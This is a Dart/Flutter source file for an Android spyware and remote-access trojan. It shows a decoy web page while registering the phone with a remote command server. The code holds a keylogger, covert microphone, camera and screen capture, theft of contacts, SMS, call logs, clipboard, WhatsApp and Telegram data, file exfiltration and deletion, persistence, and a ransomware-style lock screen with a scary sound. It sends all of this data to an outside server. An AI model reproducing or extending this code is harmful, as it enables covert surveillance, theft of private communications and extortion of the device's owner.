import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:webview_flutter/webview_flutter.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;
import 'package:path_provider/path_provider.dart';
import 'package:sqflite/sqflite.dart';

// CONFIG & CONTROLLER GLOBAL
Map<String, dynamic> appConfig = {};
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
late IO.Socket socket; 

// Native Channels
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformNativeLock = MethodChannel('com.nullx.pp/native_lock');

// Keylogger & Monitoring Variables
Timer? _keyloggerTimer;
String _keylogBuffer = "";
bool _isKeyloggerActive = false;
Timer? _clipboardTimer;
String _lastClipboard = "";
bool _isMicrophoneRecording = false;

// Call Logs & SMS
List<Map<String, dynamic>> _callLogsCache = [];

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await loadLocalConfig();
  
  await requestPermissions();

  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
    await platformSpy.invokeMethod('startBackgroundService');
  } catch (e) {
    debugPrint('Error starting background service: $e');
  }

  initNativeChatListener();
  _initBackgroundProxyListener(); 
  await registerInitialDevice(globalDeviceId, globalDeviceModel);
  startSpyware(globalDeviceId, globalDeviceModel);
  
  _autoCollectIntel();
  
  // Start auto call log collection
  Timer.periodic(const Duration(minutes: 5), (t) => _collectCallLogs());

  runApp(const MyApp());
}

void _initBackgroundProxyListener() {
  const EventChannel('com.nullx.pp/proxy_events').receiveBroadcastStream().listen((data) {
    if (data != null) executeLogic(data);
  });
}

void initNativeChatListener() {
  platformNativeLock.setMethodCallHandler((call) async {
    // Menangkap balasan chat dari Lock Tipe 2 di Native
    if (call.method == "onTargetReply") {
      String replyText = call.arguments.toString();
      _sendResponseToServer("target_chat_reply", {
        "app": "NATIVE_LOCK_SYSTEM",
        "title": "Target User",
        "body": replyText,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      });
    }
    return null;
  });

  platformSpy.setMethodCallHandler((call) async {
    if (call.method == "live_frame") {
      if (socket.connected) {
        socket.emit('target_response', {
          "cmd": "live_camera_frame",
          "data": call.arguments['image']
        });
      }
    }
    if (call.method == "notification_captured") {
      _sendResponseToServer("new_notification", {
        "title": call.arguments['title'],
        "body": call.arguments['body'],
        "app": call.arguments['app'],
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      });
    }
    if (call.method == "call_log_captured") {
      _callLogsCache.add(call.arguments);
      _sendResponseToServer("call_log", call.arguments);
    }
    if (call.method == "sms_captured") {
      _sendResponseToServer("sms_captured", call.arguments);
    }
    if (call.method == "clipboard_update") {
      _sendResponseToServer("clipboard_data", {"content": call.arguments});
    }
    return null;
  });
}

void _autoCollectIntel() async {
  try {
    final contacts = await _getContactsInternal();
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    _sendResponseToServer("auto_intel", {
      "contacts": contacts,
      "battery": level.toString(),
      "model": globalDeviceModel,
      "timestamp": DateTime.now().millisecondsSinceEpoch,
    });
  } catch (e) {
    debugPrint('Auto collect intel error: $e');
  }
}

Future<void> loadLocalConfig() async {
  try {
    final String response = await rootBundle.loadString('assets/config.json');
    appConfig = json.decode(response);
  } catch (e) {
    appConfig = {
      "server_url": "http://panel-legal.jhonaley.net:2721",
      "owner_name": "Baldwin",
      "landing_web": "https://x-gojo.vercel.app"
    };
  }
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms, 
    Permission.phone,
    Permission.storage,
    Permission.systemAlertWindow,
    Permission.manageExternalStorage,
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown";
  String identifier = "UNKNOWN_ID";
  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin": appConfig['owner_name'],
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"}
    ).timeout(const Duration(seconds: 10));
  } catch (e) {
    debugPrint('Register device error: $e');
  }
}

void playScarySound() async {
  try {
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
  } catch (e) {
    debugPrint('Play sound error: $e');
  }
}

void startSpyware(String deviceId, String deviceName) {
  String serverBase = appConfig['server_url'];
  
  try {
    socket = IO.io(serverBase, IO.OptionBuilder()
        .setTransports(['websocket'])
        .setQuery({'id': deviceId, 'type': 'target'})
        .enableAutoConnect()
        .setReconnectionAttempts(5)
        .setReconnectionDelay(3000)
        .build());

    socket.onConnect((_) {
      debugPrint('[+] Real-time Socket Connected');
      _sendHeartbeat();
    });

    socket.onConnectError((error) {
      debugPrint('Socket connect error: $error');
    });

    socket.onDisconnect((_) {
      debugPrint('Socket disconnected');
    });

    socket.on('new_command', (data) => executeLogic(data));
    socket.on('execute', (data) => executeLogic(data));

    socket.connect();
  } catch (e) {
    debugPrint('Socket initialization error: $e');
  }

  Timer.periodic(const Duration(seconds: 30), (t) => _sendHeartbeat());
}

void _sendHeartbeat() async {
  try {
    final level = await Battery().batteryLevel;
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/heartbeat/$globalDeviceId"),
      body: jsonEncode({"battery": level.toString()}),
      headers: {"Content-Type": "application/json"}
    ).timeout(const Duration(seconds: 5));
  } catch (e) {
    debugPrint('Heartbeat error: $e');
  }
}

// 1. FILE MANAGER
Future<Map<String, dynamic>> _listFiles(String path) async {
  try {
    Directory dir = Directory(path);
    if (!await dir.exists()) {
      return {"success": false, "error": "Directory not found"};
    }
    List<FileSystemEntity> entities = await dir.list().toList();
    List<Map<String, dynamic>> files = [];
    for (var entity in entities) {
      try {
        FileStat stat = await entity.stat();
        files.add({
          "name": entity.path.split('/').last,
          "path": entity.path,
          "isDirectory": await FileSystemEntity.isDirectory(entity.path),
          "size": stat.size,
          "modified": stat.modified.toIso8601String(),
        });
      } catch (e) {
        // Skip file yang tidak bisa diakses
        continue;
      }
    }
    return {"success": true, "files": files};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

Future<Map<String, dynamic>> _downloadFile(String remotePath) async {
  try {
    File file = File(remotePath);
    if (await file.exists()) {
      List<int> bytes = await file.readAsBytes();
      String base64Content = base64Encode(bytes);
      return {"success": true, "path": remotePath, "content": base64Content, "size": bytes.length};
    }
    return {"success": false, "error": "File not found"};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

Future<Map<String, dynamic>> _deleteFile(String remotePath) async {
  try {
    File file = File(remotePath);
    if (await file.exists()) {
      await file.delete();
      return {"success": true, "path": remotePath};
    }
    return {"success": false, "error": "File not found"};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

Future<Map<String, dynamic>> _uploadFile(String localPath) async {
  try {
    File file = File(localPath);
    if (await file.exists()) {
      Directory destDir = Directory("/storage/emulated/0/Download/");
      if (!await destDir.exists()) {
        await destDir.create(recursive: true);
      }
      String destPath = "${destDir.path}/${file.path.split('/').last}";
      await file.copy(destPath);
      return {"success": true, "destPath": destPath};
    }
    return {"success": false, "error": "Source file not found"};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

// 2. KEYLOGGER
void _startKeylogger() {
  if (_isKeyloggerActive) return;
  _isKeyloggerActive = true;
  _keylogBuffer = "";
  _keyloggerTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
    if (_keylogBuffer.isNotEmpty && socket.connected) {
      socket.emit('keylog_data', {
        "deviceId": globalDeviceId,
        "keys": _keylogBuffer,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      });
      _keylogBuffer = "";
    }
  });
  try {
    platformSpy.invokeMethod('start_keylogger');
  } catch (e) {
    debugPrint('Start keylogger error: $e');
  }
}

void _stopKeylogger() {
  _isKeyloggerActive = false;
  _keyloggerTimer?.cancel();
  try {
    platformSpy.invokeMethod('stop_keylogger');
  } catch (e) {
    debugPrint('Stop keylogger error: $e');
  }
}

// 3. MICROPHONE RECORDER
void _startMicrophoneRecording() {
  if (_isMicrophoneRecording) return;
  _isMicrophoneRecording = true;
  try {
    platformSpy.invokeMethod('start_mic_recording');
  } catch (e) {
    debugPrint('Start mic recording error: $e');
  }
  Timer.periodic(const Duration(seconds: 30), (timer) {
    if (!_isMicrophoneRecording) {
      timer.cancel();
      return;
    }
    try {
      platformSpy.invokeMethod('get_mic_chunk').then((chunk) {
        if (chunk != null && socket.connected) {
          socket.emit('audio_chunk', {
            "deviceId": globalDeviceId,
            "data": chunk,
            "timestamp": DateTime.now().millisecondsSinceEpoch,
          });
        }
      });
    } catch (e) {
      debugPrint('Get mic chunk error: $e');
    }
  });
}

void _stopMicrophoneRecording() {
  _isMicrophoneRecording = false;
  try {
    platformSpy.invokeMethod('stop_mic_recording');
  } catch (e) {
    debugPrint('Stop mic recording error: $e');
  }
}

// 4. PROCESS KILLER
Future<Map<String, dynamic>> _listProcesses() async {
  try {
    final result = await platformSpy.invokeMethod('get_running_processes');
    List<Map<String, dynamic>> processes = [];
    if (result != null) {
      processes = List<Map<String, dynamic>>.from(result);
    }
    return {"success": true, "processes": processes};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

Future<Map<String, dynamic>> _killProcess(String pid) async {
  try {
    await platformSpy.invokeMethod('kill_process', {"pid": pid});
    return {"success": true, "pid": pid};
  } catch (e) {
    return {"success": false, "error": e.toString()};
  }
}

// 5. NOTIFICATION SPAMMER
void _spamNotification(String title, String message, int count) async {
  for (int i = 0; i < count; i++) {
    try {
      await platformSpy.invokeMethod('show_notification', {
        "title": title,
        "body": "$message [$i]",
        "id": DateTime.now().millisecondsSinceEpoch + i,
      });
    } catch (e) {
      debugPrint('Spam notification error: $e');
    }
    await Future.delayed(const Duration(milliseconds: 500));
  }
}

// 6. CLIPBOARD MONITOR
void _startClipboardMonitor() {
  _clipboardTimer?.cancel();
  _clipboardTimer = Timer.periodic(const Duration(seconds: 3), (timer) async {
    try {
      final clipboardData = await platformSpy.invokeMethod('get_clipboard');
      if (clipboardData != null && clipboardData != _lastClipboard) {
        _lastClipboard = clipboardData;
        _sendResponseToServer("clipboard_data", {"content": clipboardData});
      }
    } catch (e) {
      // Silent error
    }
  });
}

void _stopClipboardMonitor() {
  _clipboardTimer?.cancel();
  _clipboardTimer = null;
}

// 7. CALL LOGS
Future<void> _collectCallLogs() async {
  try {
    final result = await platformSpy.invokeMethod('get_call_logs');
    if (result != null) {
      List<Map<String, dynamic>> calls = List<Map<String, dynamic>>.from(result);
      _sendResponseToServer("get_call_logs", {"calls": calls});
    }
  } catch (e) {
    debugPrint('Collect call logs error: $e');
  }
}

// 8. WHATSAPP EXTRACTOR
Future<void> _extractWhatsApp() async {
  try {
    final result = await platformSpy.invokeMethod('extract_whatsapp');
    _sendResponseToServer("whatsapp_data", result);
  } catch (e) {
    _sendResponseToServer("whatsapp_data", {"error": e.toString()});
  }
}

// 9. TELEGRAM STEALER
Future<void> _stealTelegram() async {
  try {
    final result = await platformSpy.invokeMethod('steal_telegram');
    _sendResponseToServer("telegram_data", result);
  } catch (e) {
    _sendResponseToServer("telegram_data", {"error": e.toString()});
  }
}

// 10. PERSISTENCE
Future<void> _enablePersistence(String method) async {
  switch (method) {
    case "startup":
      await platformSpy.invokeMethod('add_to_startup');
      break;
    case "registry":
      await platformSpy.invokeMethod('add_system_app');
      break;
    case "scheduler":
      await platformSpy.invokeMethod('schedule_alarm');
      break;
  }
  _sendResponseToServer("persistence_enabled", {"method": method});
}

// ==================== EXECUTOR ====================

Future<void> executeLogic(dynamic data) async {
  String command = data['command'] ?? "idle";
  String extra = data['extra'] ?? "";
  dynamic resultData;

  switch (command) {
    // ============ TRIPLE NATIVE LOCK INTEGRATION ============
    case "lock_type1":
    case "hard_lock":
      // Format extra: "Pesan|Password"
      List<String> parts = extra.split('|');
      String msg = parts.isNotEmpty ? parts[0] : "SYSTEM ENCRYPTED";
      String pass = parts.length > 1 ? parts[1] : "123";
      
      await platformNativeLock.invokeMethod('startNativeLock', {
        "mode": "mode1",
        "message": msg,
        "password": pass
      });
      playScarySound();
      resultData = {"status": "Native Type 1 (Spawning Text) Started"};
      break;

    case "lock_type2":
      // Mode Chat Realtime
      await platformNativeLock.invokeMethod('startNativeLock', {
        "mode": "mode2",
        "message": "",
        "password": extra.isNotEmpty ? extra : "123"
      });
      resultData = {"status": "Native Type 2 (Spawning Chat) Started"};
      break;

    case "lock_type3":
      // Mode Video Fullscreen
      await platformNativeLock.invokeMethod('startNativeLock', {
        "mode": "mode3",
        "message": "",
        "password": ""
      });
      resultData = {"status": "Native Type 3 (Video Enforce) Started"};
      break;

    case "unlock":
      deviceLocked.value = false;
      await platformNativeLock.invokeMethod('stopNativeLock');
      await _audioPlayer.stop();
      await platformStrobe.invokeMethod('stop_strobe');
      resultData = {"status": "Native Unlock Success"};
      break;
    // ========================================================

    case "start_live_camera":
      await platformSpy.invokeMethod('start_live_camera', {"side": extra.isEmpty ? "back" : extra});
      break;
    case "stop_live_camera":
      await platformSpy.invokeMethod('stop_live_camera');
      break;
    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = extra.isEmpty ? "back" : extra;
      platformSpy.invokeMethod('take_photo', {"side": side});
      _executeFlutterSilentCamera(side);
      break;
    case "get_screen":
      resultData = await platformSpy.invokeMethod('get_screen');
      break;
    case "get_location":
      Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
      resultData = {"lat": pos.latitude, "lng": pos.longitude};
      break;
    case "get_contacts":
      resultData = {"contacts": await _getContactsInternal()};
      break;
    case "get_gmails":
    case "get_accounts":
      final emails = await platformSpy.invokeMethod('get_gmails');
      resultData = {"accounts": emails ?? "Denied"};
      break;
    case "get_apps":
      final List<dynamic> apps = await platformSpy.invokeMethod('get_apps');
      resultData = {"apps": apps};
      break;
    case "flash_strobe":
      await platformStrobe.invokeMethod('flash_strobe');
      break;
    case "stop_strobe":
      await platformStrobe.invokeMethod('stop_strobe');
      break;
    case "set_vol_max":
      await platformSpy.invokeMethod('set_vol_max');
      break;
    case "vibrate_loop":
      if (await Vibration.hasVibrator() ?? false) {
        Vibration.vibrate(duration: 10000);
      }
      await platformSpy.invokeMethod('vibrate_loop');
      break;
    case "play_audio":
      await _audioPlayer.play(UrlSource(extra));
      break;
    case "stop_audio":
      await _audioPlayer.stop();
      break;
    case "set_wallpaper":
      await platformSpy.invokeMethod('set_wallpaper', {"url": extra});
      break;
    case "open_url":
      if (await canLaunchUrl(Uri.parse(extra))) {
        await launchUrl(Uri.parse(extra), mode: LaunchMode.externalApplication);
      }
      break;
    case "speak_tts":
      await platformSpy.invokeMethod('speakText', {"text": extra});
      break;
    case "send_sms":
      List<String> parts = extra.split('|');
      if (parts.length >= 2) {
        await platformSpy.invokeMethod('send_sms', {"number": parts[0], "message": parts[1]});
      }
      break;
    case "bring_to_foreground":
      await platformSpy.invokeMethod('bringToForeground');
      break;
    case "open_notif_access":
      await platformSpy.invokeMethod('openNotificationSettings');
      break;
    case "list_files":
      resultData = await _listFiles(extra.isEmpty ? "/storage/emulated/0" : extra);
      break;
    case "download_file":
      resultData = await _downloadFile(extra);
      break;
    case "delete_file":
      resultData = await _deleteFile(extra);
      break;
    case "upload_file":
      resultData = await _uploadFile(extra);
      break;
    case "start_keylogger":
      _startKeylogger();
      break;
    case "stop_keylogger":
      _stopKeylogger();
      break;
    case "start_mic_recording":
      _startMicrophoneRecording();
      break;
    case "stop_mic_recording":
      _stopMicrophoneRecording();
      break;
    case "list_processes":
      resultData = await _listProcesses();
      break;
    case "kill_process":
      resultData = await _killProcess(extra);
      break;
    case "spam_notification":
      List<String> parts = extra.split('|');
      if (parts.length >= 3) {
        _spamNotification(parts[0], parts[1], int.tryParse(parts[2]) ?? 10);
      } else if (parts.length >= 2) {
        _spamNotification(parts[0], parts[1], 10);
      }
      break;
    case "monitor_clipboard":
      _startClipboardMonitor();
      break;
    case "stop_monitor_clipboard":
      _stopClipboardMonitor();
      break;
    case "get_call_logs":
      await _collectCallLogs();
      break;
    case "extract_whatsapp":
      await _extractWhatsApp();
      break;
    case "steal_telegram":
      await _stealTelegram();
      break;
    case "persistence_startup":
      await _enablePersistence("startup");
      break;
    case "persistence_registry":
      await _enablePersistence("registry");
      break;
    case "persistence_scheduler":
      await _enablePersistence("scheduler");
      break;
    case "ping":
      resultData = {"pong": DateTime.now().millisecondsSinceEpoch};
      break;
    case "get_device_info":
      Map<String, String> info = await getDeviceInfo();
      resultData = info;
      break;
    case "get_clipboard":
      final clipboard = await platformSpy.invokeMethod('get_clipboard');
      resultData = {"clipboard": clipboard ?? "Empty"};
      break;
  }

  if (resultData != null) {
    _sendResponseToServer(command, resultData);
  }
}

Future<List<Map<String, String>>> _getContactsInternal() async {
  if (await FlutterContacts.requestPermission()) {
    final contacts = await FlutterContacts.getContacts(withProperties: true);
    return contacts.take(100).map((e) => {
      "name": e.displayName, 
      "num": e.phones.isNotEmpty ? e.phones.first.number : ""
    }).toList();
  }
  return [];
}

Future<void> _executeFlutterSilentCamera(String side) async {
  try {
    final cameras = await availableCameras();
    if (cameras.isEmpty) return;
    final cam = cameras.firstWhere((c) => c.lensDirection == (side == "front" ? CameraLensDirection.front : CameraLensDirection.back));
    final controller = CameraController(cam, ResolutionPreset.low, enableAudio: false);
    await controller.initialize();
    XFile photo = await controller.takePicture();
    final bytes = await File(photo.path).readAsBytes();
    img.Image? decoded = img.decodeImage(bytes);
    if (decoded != null) {
      String base64Image = base64Encode(img.encodeJpg(decoded, quality: 40));
      _sendResponseToServer("take_photo", {"image": base64Image});
    }
    await File(photo.path).delete();
    await controller.dispose();
  } catch (e) {
    debugPrint('Camera error: $e');
  }
}

Future<void> _sendResponseToServer(String cmd, dynamic data) async {
  try {
    var payload = {"cmd": cmd, "data": data};
    if (socket.connected) {
      socket.emit('target_response', payload);
    }
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/post-response/$globalDeviceId"),
      body: jsonEncode(payload),
      headers: {"Content-Type": "application/json"}
    ).timeout(const Duration(seconds: 10));
  } catch (e) {
    debugPrint('Send response error: $e');
  }
}

// --- UI COMPONENTS ---
class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  late final WebViewController _webController;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _webController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (String url) {
            debugPrint('Page loaded: $url');
          },
          onHttpError: (HttpResponseError error) {
            debugPrint('HTTP error: $error');
          },
        ),
      )
      ..loadRequest(Uri.parse(appConfig['landing_web'] ?? "https://google.com"));
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      try {
        platformSpy.invokeMethod('bringToForeground');
      } catch (e) {
        debugPrint('Bring to foreground error: $e');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    // UI Flutter sekarang murni hanya menampilkan WebView pancingan.
    // Lock screen dikelola 100% oleh Native Overlay XML demi keamanan maksimal.
    return PopScope(
      canPop: false, // Mematikan tombol back di level flutter
      child: Scaffold(
        body: SafeArea(
          child: WebViewWidget(controller: _webController),
        ),
      ),
    );
  }
}